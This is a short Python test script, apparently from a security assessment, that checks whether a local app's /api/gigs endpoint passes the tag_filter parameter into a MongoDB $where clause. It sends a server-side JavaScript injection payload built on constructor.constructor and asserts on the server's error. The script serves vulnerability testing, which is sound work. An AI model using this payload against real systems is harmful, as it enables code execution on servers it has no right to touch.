"""
WSTG-INPV-06 / WSTG-INPV-11: User input reaches a Mongo $where expression.
Expected: tag_filter values trigger the $where query path and a Mongo server error.
"""
import requests

BASE = "http://localhost:3000"

for payload in ("false", "true", 'this.constructor.constructor("return process.version")()'):
    r = requests.get(f"{BASE}/api/gigs", params={"tag_filter": payload}, timeout=10)
    print(payload, r.status_code, r.text[:120])
    assert r.status_code == 500
    assert "$where is not allowed in this context" in r.text

print("\n[VULNERABLE] tag_filter is interpolated into a server-side $where clause")
